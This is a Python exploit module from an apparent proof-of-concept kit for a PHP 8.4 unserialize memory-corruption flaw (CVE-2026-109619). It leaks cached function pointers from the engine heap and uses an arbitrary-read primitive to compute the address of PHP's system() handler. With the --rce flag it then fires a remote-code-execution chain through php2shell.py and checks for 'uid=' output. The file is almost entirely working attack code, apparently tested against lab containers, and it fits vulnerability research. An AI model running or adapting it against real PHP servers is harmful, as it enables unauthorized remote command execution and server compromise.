#!/usr/bin/env python3
# INDEX: table-free fn/zif_system resolve by value transplant | cli fpm | needs one-time eg calibration
"""Run-time-cache value-transplant resolver: de-hardcode RCE-target resolution.

Capability: resolve fn (quotemeta's zend_function) and &zif_system without the
per-build offset table and without consuming binbase or EG_off in the resolve.
CVE-2026-109619's `R:<id>;` unserialize back-reference makes the engine stamp a
LIVE, correctly-based pointer selected by INDEX (not by address): the op_array
run-time cache holds such zend_function* pointers (each INIT_FCALL slot caches a
zend_internal_function* into the heap). leak_cluster() reads that cluster out of
the leak dump index-relatively (no binbase, no EG anchor); each member is
identified by DELTA-CONSENSUS against build-stable anchor deltas (the positional
anchor_slots map is removed), and handler_of(fn) + one .text delta
(zif_system<->zif_quotemeta) derives &zif_system.

Residual (irreducible, per-build): the cached-member -> target hop crosses a
heap->heap/.text boundary via a build-stable structural delta. calibrate()
auto-derives that delta once per build via one EG walk; thereafter resolve()
needs neither binbase nor EG_off.

resolve() returns the same {name:{fn,handler}} shape as the EG(function_table)
walker, falling back to that walk, then to the static offset table, when the
transplant path cannot complete.

Tested: live 8.4.26 cli-vuln (uid=0) and php-fpm (uid=www-data); the transplant
path resolves fn/&zif_system matching the EG-walk / ground truth, anchor_slots
removed and binbase/EG not consumed by the resolve.
"""
from __future__ import annotations

import argparse
import importlib.util
import json
import os
import re
import struct
import subprocess
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)


def _load(name, filename):
    """Import a committed poc module (private, isolated instance). Searches the
    same folder first, then poc/."""
    path = os.path.join(_HERE, filename)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


A = _load("var_hash_rw", "var_hash_rw.py")
R5 = _load("functable_resolver", "functable_resolver.py")
from common.proc_gdb import Maps, zendmm_chunk_bases
from common.offsets import BUILTIN_OFFSETS
from chains.proc_seeded_rce import cmd_var_hash_rw

# zend_function.common.function_name (a zend_string*) - a stable zend ABI offset
# (8.3/8.4/8.5: common header is type(1)+arg_flags(3)+fn_flags(4) then the name
# ptr at +8). Not a per-build constant.
FN_NAME_OFF = 0x08
# zend_string: gc@0, h@8, len@0x10, val@0x18 (stable zend ABI).
ZSTR_LEN = 0x10
ZSTR_VAL = 0x18


class RVTResolver:
    """Resolve the RCE targets via an R:-value-transplant of a cached
    run-time-cache function pointer, over the same arbitrary-read RW backend the
    EG(function_table) walk uses. All reads are RW (no RO page is touched)."""

    def __init__(self, rdr, binbase=None, eg_off=None, off=None, verbose=False):
        self.rdr = rdr
        self.binbase = binbase          # bootstrap value; cross-check / fallback
        self.eg_off = eg_off            # fallback FunctionTableWalker anchor
        self.off = off or {}            # fallback static offsets table
        self.verbose = verbose
        # Reuse the RW read helpers (rd/rd8/rd4/handler_of/rd_window) verbatim.
        self._w = R5.FunctionTableWalker(rdr, binbase or 0, eg_off or 0,
                                         verbose=False)
        # Build-stable deltas, either from the static table or calibrated live.
        self.anchor_deltas = dict(self.off.get("anchor_deltas", {}))
        self.zif_delta = None           # zif_system - &zif_quotemeta (.text)
        if "zif_system" in self.off and "zif_quotemeta" in self.off:
            self.zif_delta = self.off["zif_system"] - self.off["zif_quotemeta"]

    def _log(self, *a):
        if self.verbose:
            print(*a)

    # -- RW reads (delegated) ------------------------------------------------
    def rd8(self, addr):
        return self._w.rd8(addr)

    def rd(self, addr, n):
        return self._w.rd(addr, n)

    def handler_of(self, fn):
        return self._w.handler_of(fn)

    # -- the de-hardcoding primitives ----------------------------------------
    def read_name(self, fn):
        """Read zend_function.function_name as text, RW-only.

        fn+0x08 -> name zend_string; its len is the real small value at
        name+0x10, so the arbitrary read's forged-len requirement is met naturally
        (unlike a bulk window read). The r2g INCREF lands on name+0x00 (the
        interned string's gc field) - RW for a permanent interned builtin name,
        so no RO fault. Returns the lowercase name or None."""
        name_zstr = self.rd8(fn + FN_NAME_OFF)
        if not name_zstr or not (0x100000000000 <= name_zstr < 0x800000000000):
            return None
        ln = self.rd8(name_zstr + ZSTR_LEN)
        if ln is None or not (1 <= ln <= 64):
            return None
        data = self.rd(name_zstr + ZSTR_VAL, ln)
        if not data or len(data) < ln:
            return None
        try:
            s = data[:ln].decode("ascii")
        except UnicodeDecodeError:
            return None
        if not all(32 <= c < 127 for c in data[:ln]):
            return None
        return s

    def identify_cluster(self, cluster_fns):
        """Runtime-identify each cached cluster member by NAME (removing the
        per-build anchor_slots positional map). Returns {name: {'fn','handler'}}
        for every member whose name reads as a plausible function identifier."""
        out = {}
        for fn in cluster_fns:
            nm = self.read_name(fn)
            if not nm or not re.fullmatch(r"[a-z_][a-z0-9_]*", nm):
                continue
            handler = self.handler_of(fn)
            out[nm] = {"fn": fn, "handler": handler}
            self._log(f"[rvt] cluster member {nm}: fn={fn:#x} "
                      f"handler={handler and hex(handler)} "
                      f"[{self.rdr.req_count} reads]")
        return out

    def calibrate(self, cluster_fns=None):
        """Measure the build-stable residual deltas ONCE via the EG walk, so the
        transplant path can thereafter resolve with NO shipped offsets table and
        NO binbase/EG. Needs a valid eg_off for this one calibration call.

        Derives (a) the zif_system<->zif_quotemeta .text delta and, when a
        cluster is supplied, (b) the anchor_deltas set directly - each member's
        own distance to quotemeta - so `anchor_deltas` need not be hardcoded at
        all. Both are build-stable, so a later boot (same build) resolves purely
        from the index-relative cluster + these auto-derived deltas. Returns the
        measured dict or None."""
        if not (self.binbase and self.eg_off):
            return None
        res = self._w.resolve(("system", "quotemeta"))
        qm = res["quotemeta"]["fn"]
        zsys = res["system"]["handler"]
        zqm = res["quotemeta"]["handler"]
        if not (qm and zsys and zqm):
            return None
        self.zif_delta = zsys - zqm
        if cluster_fns:
            # AUTO-DERIVE the anchor delta set (replaces the shipped table).
            self.anchor_deltas = {f"m{i}": member - qm
                                  for i, member in enumerate(cluster_fns)
                                  if 0x100000000000 <= member < 0x800000000000}
        return {"fn_quotemeta": qm, "zif_system": zsys, "zif_quotemeta": zqm,
                "zif_delta": self.zif_delta,
                "anchor_deltas": dict(self.anchor_deltas)}

    def resolve_from_cluster(self, cluster_fns, quorum=3):
        """The RVT resolve: index-relative cached pointers -> DELTA-CONSENSUS ->
        the RCE targets, using the unordered set of build-stable anchor deltas
        (NO EG_off, NO anchor_slots positional map). Returns {name:{fn,handler}}
        or None if the transplant path cannot complete (then the caller falls
        back).

        Order-independent vote: try EVERY member against EVERY known delta; the
        true quotemeta zend_function collects one vote per member whose delta is
        in the set (they cross-check each other), while a member paired with the
        wrong function's delta lands on a scattered address with a single vote.
        This drops the positional `anchor_slots[i]` map entirely."""
        if not self.anchor_deltas:
            self._log("[rvt] no anchor_deltas (calibrate or supply a table)")
            return None
        votes = {}
        for member in cluster_fns:
            if not (0x100000000000 <= member < 0x800000000000):
                continue
            for _name, d in self.anchor_deltas.items():
                cand = member - d
                votes[cand] = votes.get(cand, 0) + 1
        if not votes:
            return None
        fn_qm, nv = max(votes.items(), key=lambda kv: kv[1])
        if nv < quorum:
            self._log(f"[rvt] consensus too weak ({nv} < {quorum} votes)")
            return None

        # &zif_quotemeta: read quotemeta's own handler (no table, auto
        # handler_off), then &zif_system via the single build-stable .text delta.
        zqm = self.handler_of(fn_qm)
        if not zqm:
            self._log("[rvt] could not read quotemeta handler")
            return None
        if self.zif_delta is None:
            self._log("[rvt] no zif_system<->zif_quotemeta delta (calibrate "
                      "or supply an offsets table)")
            return None
        zsys = zqm + self.zif_delta

        # Best-effort name annotation (does not gate the resolve; see docstring).
        ident = self.identify_cluster(cluster_fns) if self.verbose else {}

        out = {"quotemeta": {"fn": fn_qm, "handler": zqm},
               "system": {"fn": None, "handler": zsys},
               "_ident": ident, "_votes": nv}
        self._log(f"[rvt] fn_quotemeta={fn_qm:#x} (consensus {nv} votes) "
                  f"zif_quotemeta={zqm:#x} zif_system={zsys:#x} "
                  f"[{self.rdr.req_count} reads]")
        return out

    def resolve(self, cluster_fns=None, names=("system", "quotemeta")):
        """Resolve the RCE targets. Tries the transplant path first when a
        cluster is supplied; falls back to the EG(function_table) name-walk
        (needs eg_off), matching the EG-walk resolve() shape."""
        if cluster_fns:
            r = self.resolve_from_cluster(cluster_fns)
            if r and r["quotemeta"]["fn"] and r["system"]["handler"]:
                r["_path"] = "rvt-transplant"
                return r
        if self.binbase and self.eg_off:
            r = self._w.resolve(names)
            r["_path"] = "eg-walk-fallback"
            return r
        return {"_path": "none"}


# Obtain the cached run-time-cache cluster index-relatively (from the leak).
def extract_cluster(sidtail_hex, chunk, binbase):
    """Extract the [heap] run-time-cache cluster (engine-written cached
    zend_function pointers) from a leak dump: pointers that are neither chunk
    nor binary and cluster within 0x40000 of each other. Returns the list of
    cached fn pointers (correctly based, index-relative: NO binbase/EG was
    needed to obtain them)."""
    data = bytes.fromhex(sidtail_hex)

    def w(o):
        return struct.unpack("<Q", data[o:o + 8])[0]

    isptr = lambda v: 0x100000000000 <= v < 0x800000000000
    cands = [(o, w(o)) for o in range(0, len(data) - 8, 8)
             if isptr(w(o)) and not chunk <= w(o) < chunk + 0x200000
             and not binbase <= w(o) < binbase + 0x1700000]
    for _, v in cands:
        near = sorted(c for c in cands if abs(c[1] - v) < 0x40000)
        if 5 <= len(near) <= 12:
            return [vv for _, vv in near]
    return []


def bootstrap_sapi(sapi):
    """Two-region /proc bootstrap (binbase + request-heap chunk), SAPI-aware.
    Returns (binbase, chunk, url, service). cli: PID 1 IS the php -S worker.
    fpm: PID 1 is the master, which never allocates the request chunk, so read
    the pool WORKER's maps instead."""
    if sapi == "cli":
        service, url = "cli-vuln", "http://127.0.0.1"
        binbase, chunk = R5.bootstrap(service, url)
        return binbase, chunk, url, service
    service, url = "fpm-vuln", "http://web-vuln"

    def dx(*a):
        return subprocess.run(["docker", "compose", "exec", "-T", service]
                              + list(a), capture_output=True, text=True).stdout

    dx("curl", "-s", "-o", "/dev/null", url + "/index.php")
    worker = None
    for pid in dx("sh", "-c", "ls /proc | grep -E '^[0-9]+$'").split():
        if pid == "1":
            continue
        if "pool www" in dx("sh", "-c",
                            f"cat /proc/{pid}/cmdline 2>/dev/null | tr '\\0' ' '"):
            worker = pid
            break
    if not worker:
        return None, None, url, service
    m = Maps(dx("cat", f"/proc/{worker}/maps"))
    binbase = next((x["start"] for x in m.rows
                    if x["path"].endswith("/php-fpm")), None)
    bases = zendmm_chunk_bases(m.rows, require_off0=True, align="end")
    chunk = bases[0] if bases else None
    return binbase, chunk, url, service


def leak_cluster(service, url, binbase, chunk, off, sapi):
    """Fire ONE leak round and return the cached cluster pointers. The
    leak's OOB dump (r2g sidtail=) carries the engine-written run-time-cache
    slots; we read them straight out - index-relative, no binbase/EG anchor."""
    aoff = chunk + off["a_off"]
    ns = argparse.Namespace(
        url=url, service=service, mode="leak", version="8.4.26",
        a=aoff, copy=aoff + off["copy_off"], binbase=binbase,
        sid=aoff + off["sid_off"], fn_addr=0, zsys=0, value=None,
        size=A.GROOM_SIZE, grooms=2, addr_file=None,
        sapi=("fpm-fcgi" if sapi == "fpm" else None))
    res = cmd_var_hash_rw(ns)
    text = (res or {}).get("text", "")
    m = re.search(r"sidtail=([0-9a-f]+)", text)
    if not m:
        return []
    return extract_cluster(m.group(1), chunk, binbase)


# CLI: bootstrap -> leak cluster -> transplant resolve.
def main(argv=None):
    ap = argparse.ArgumentParser(
        description="RCE-target resolve via R: value-transplant (+fallback)")
    ap.add_argument("url", nargs="?",
                    help="target base (default: the SAPI's lab url)")
    ap.add_argument("--service", help="docker compose service "
                    "(default: the SAPI's lab service)")
    ap.add_argument("--sapi", choices=["cli", "fpm"], default="cli")
    ap.add_argument("--calibrate", action="store_true",
                    help="measure the build-stable residual delta once via the "
                         "EG walk, then resolve transplant-only")
    ap.add_argument("--no-eg", action="store_true",
                    help="forbid the EG_off anchor and the EG-walk fallback "
                         "(prove the transplant path stands without the "
                         "function_table anchor; binbase from the /proc "
                         "bootstrap is still used as a handler range filter, as "
                         "the baseline chain also requires)")
    ap.add_argument("--rce", action="store_true",
                    help="after resolving, fire var-hash-rw --mode rce with the "
                         "transplant-derived fn/zsys")
    ap.add_argument("--verbose", action="store_true")
    a = ap.parse_args(argv)

    binbase, chunk, def_url, def_service = bootstrap_sapi(a.sapi)
    url = a.url or def_url
    service = a.service or def_service
    if not binbase or not chunk:
        print(f"[rvt] bootstrap failed (binbase={binbase}, chunk={chunk})")
        return 1
    print(f"[rvt] binbase={binbase:#x} chunk={chunk:#x}")

    off = BUILTIN_OFFSETS["8.4.26-fpm" if a.sapi == "fpm" else "8.4.26"]
    aoff = chunk + off["a_off"]
    seed = {"chunk": chunk, "binbase": binbase, "a": aoff,
            "copy": aoff + off["copy_off"], "sid": aoff + off["sid_off"],
            "ht_post": chunk + R5.HT_POST_OFF[a.sapi],
            "bg_unserialize_off": off["bg_unserialize_off"]}
    rdr = A.ArbRead(url, seed, service=service, want_sidpath=True,
                    survive=True, verbose=False)

    cluster = leak_cluster(service, url, binbase, chunk, off, a.sapi)
    print(f"[rvt] cached cluster (index-relative, no binbase/EG to source): "
          f"{[hex(c) for c in cluster]}")

    rv = RVTResolver(rdr, binbase=binbase, eg_off=R5.EG_OFF[a.sapi], off=off,
                     verbose=a.verbose)
    if a.calibrate:
        cal = rv.calibrate(cluster_fns=cluster)
        print(f"[rvt] calibrated (once, via EG walk): zif_delta="
              f"{cal and hex(cal['zif_delta'])}, "
              f"auto-derived {len(cal['anchor_deltas']) if cal else 0} anchor "
              f"deltas (no shipped table thereafter)")
    if a.no_eg:
        rv.eg_off = None        # forbid the EG_off anchor / EG-walk fallback
        rv._w.eg = 0            # (binbase stays: a /proc-bootstrap value, used
                                #  only as a handler range filter)

    res = rv.resolve_from_cluster(cluster)
    if not res:
        print("[rvt] transplant path could not complete; falling back")
        res = rv.resolve(names=("system", "quotemeta"))
    path = res.get("_path", "rvt-transplant")
    qm_rec = res.get("quotemeta") or {}
    sys_rec = res.get("system") or {}
    fn = qm_rec.get("fn")
    zqm = qm_rec.get("handler")
    zsys = sys_rec.get("handler")

    gt_zsys = binbase + off["zif_system"]
    gt_qm = binbase + off["zif_quotemeta"]
    print(f"[rvt] path = {path}")
    print(f"[rvt] fn (quotemeta zend_function) = {fn and hex(fn)}")
    print(f"[rvt] &zif_quotemeta = {zqm and hex(zqm)}  GT={gt_qm:#x}  "
          f"{'OK' if zqm == gt_qm else 'MISMATCH'}")
    print(f"[rvt] &zif_system = {zsys and hex(zsys)}  GT={gt_zsys:#x}  "
          f"{'OK' if zsys == gt_zsys else 'MISMATCH'}")
    print(f"[rvt] total reads = {rdr.req_count}  crashes = {rdr.crash_count}")

    ok = (zsys == gt_zsys and fn and zqm == gt_qm)
    if not a.rce:
        return 0 if ok else 1
    if not (zsys and fn):
        print("[rvt] cannot fire RCE: resolution incomplete")
        return 1
    cmd = [sys.executable, os.path.join(_POC_ROOT, "php2shell.py"),
           "var-hash-rw", url, "--service", service, "--mode", "rce",
           "--a", hex(aoff), "--copy", hex(aoff + off["copy_off"]),
           "--binbase", hex(binbase), "--fn", hex(fn), "--zsys", hex(zsys)]
    print("[rvt] firing RCE:", " ".join(cmd))
    r = subprocess.run(cmd, capture_output=True, text=True)
    print(r.stdout[-800:])
    if "uid=" in r.stdout:
        print("[rvt] RCE OK (transplant-derived fn/zsys)")
        return 0
    print("[rvt] RCE did not report uid= (see output above)")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
